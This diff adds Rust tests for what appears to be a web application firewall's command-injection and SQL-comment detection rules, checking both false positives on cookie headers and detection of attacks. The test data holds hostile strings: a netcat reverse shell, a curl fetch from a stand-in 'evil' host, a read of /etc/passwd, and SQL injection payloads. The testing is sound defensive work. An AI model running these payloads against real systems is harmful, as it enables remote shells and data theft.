@@ -391,3 +391,72 @@ async fn get_rules(db: &SqlitePool, policy_id: i64) -> Vec<RuleRow> {
         })
         .collect()
 }
+
+#[cfg(test)]
+mod tests {
+    use regex::Regex;
+
+    /// Pull one rule's pattern out of the shipped catalog, so the test checks
+    /// what actually loads rather than a copy that can drift from it.
+    fn pattern(file: &str, id: u32) -> String {
+        let text = std::fs::read_to_string(format!("rules/{file}"))
+            .unwrap_or_else(|e| panic!("rules/{file}: {e}"));
+        for block in text.split("[[rules]]").skip(1) {
+            if !block.contains(&format!("id          = {id}")) {
+                continue;
+            }
+            for line in block.lines() {
+                if let Some(rest) = line.trim().strip_prefix("pattern     = ") {
+                    return rest.trim().trim_matches('\'').to_string();
+                }
+            }
+        }
+        panic!("rule {id} not found in rules/{file}");
+    }
+
+    #[test]
+    fn command_chaining_ignores_names_that_merely_start_with_a_command() {
+        let re = Regex::new(&pattern("932-rce.toml", 932012)).unwrap();
+
+        // A Cookie header is semicolon-separated by definition, so these are
+        // ordinary traffic. "nc" matching the "nc" of "nc_token" scored 8 of a
+        // threshold of 10 on every request an application like Nextcloud made.
+        for benign in [
+            "oc_sessionPassphrase=abc; nc_token=xyz",
+            "a=1; nc_username=yariv",
+            "session=1; identity=bob",
+            "x=1; catalogue=shoes",
+            "x=1; lsp_id=42",
+            "x=1; shop_cart=3",
+        ] {
+            assert!(!re.is_match(benign), "false positive on {benign:?}");
+        }
+    }
+
+    #[test]
+    fn command_chaining_still_catches_the_real_thing() {
+        let re = Regex::new(&pattern("932-rce.toml", 932012)).unwrap();
+        for attack in [
+            "; nc -e /bin/sh 10.0.0.1",
+            "; ls -la",
+            "| cat /etc/passwd",
+            "; whoami",
+            "`id`",
+            ";curl http://evil/x",
+            "; netcat 10.0.0.1 4444",
+        ] {
+            assert!(re.is_match(attack), "missed {attack:?}");
+        }
+    }
+
+    #[test]
+    fn the_sql_comment_rule_ignores_a_mime_wildcard() {
+        let re = Regex::new(&pattern("942-sqli.toml", 942007)).unwrap();
+        // Every HTTP client sends this by default.
+        assert!(!re.is_match("*/*"));
+        assert!(!re.is_match("text/html, */*;q=0.8"));
+        // Still catches comments used to truncate a query.
+        assert!(re.is_match("' OR 1=1 --"));
+        assert!(re.is_match("UNION/**/SELECT"));
+    }
+}
